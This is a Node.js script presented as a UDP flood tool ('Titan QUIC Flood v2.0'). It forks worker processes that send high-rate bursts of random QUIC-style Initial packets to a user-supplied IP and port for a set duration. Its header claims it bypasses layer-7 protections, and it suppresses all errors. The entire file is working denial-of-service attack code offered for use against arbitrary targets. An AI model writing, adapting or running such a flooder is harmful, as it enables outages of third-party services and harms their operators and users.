#!/usr/bin/env node
// ============================================================
// Titan QUIC Flood v2.0 - HTTP/3 UDP Flood
// Author: github.com/thesystemowner
// Technique: QUIC Initial packets (UDP), bypasses L7 protections
// ============================================================

process.on('uncaughtException', () => {});
process.on('unhandledRejection', () => {});
process.setMaxListeners(0);

const dgram = require('dgram');
const cluster = require('cluster');
const crypto = require('crypto');

const args = process.argv.slice(2);
if (args.length < 4) {
    console.log(`Usage: node titan-quic-flood.js <ip> <port> <time> <pps> [threads]`);
    process.exit(1);
}

const ip = args[0];
const port = parseInt(args[1]);
const duration = parseInt(args[2]);
const pps = parseInt(args[3]);
const threads = parseInt(args[4]) || 1;

function randomBytes(len) { return crypto.randomBytes(len); }

function buildQUICInitial() {
    const dcid = randomBytes(8);
    const scid = randomBytes(8);
    const version = Buffer.from([0x00, 0x00, 0x00, 0x01]);
    const token = Buffer.alloc(0);
    const payload = randomBytes(Math.floor(Math.random() * 128) + 64);

    const type = 0xc0 | 8;
    const packet = Buffer.concat([
        Buffer.from([type]), dcid, Buffer.from([8]), scid, Buffer.from([8]),
        Buffer.alloc(4), token, version, Buffer.alloc(4), payload,
    ]);
    return packet;
}

function worker() {
    const sock = dgram.createSocket('udp4');
    sock.unref();

    function sendBurst() {
        const batchSize = Math.min(pps, 500);
        for (let i = 0; i < batchSize; i++) {
            const pkt = buildQUICInitial();
            sock.send(pkt, 0, pkt.length, port, ip, (err) => { if (err) sock.close(); });
        }
    }
    setInterval(sendBurst, 1000 / Math.ceil(pps / 500) || 1);
}

if (cluster.isMaster) {
    console.log(`[+] Titan QUIC Flood`);
    console.log(`[+] Author: github.com/thesystemowner`);
    console.log(`[+] Target: ${ip}:${port}`);
    console.log(`[+] Duration: ${duration}s`);
    console.log(`[+] PPS: ${pps} | Threads: ${threads}`);

    for (let i = 0; i < threads; i++) cluster.fork();
    setTimeout(() => { console.log('[+] Done'); process.exit(0); }, duration * 1000);
} else { worker(); }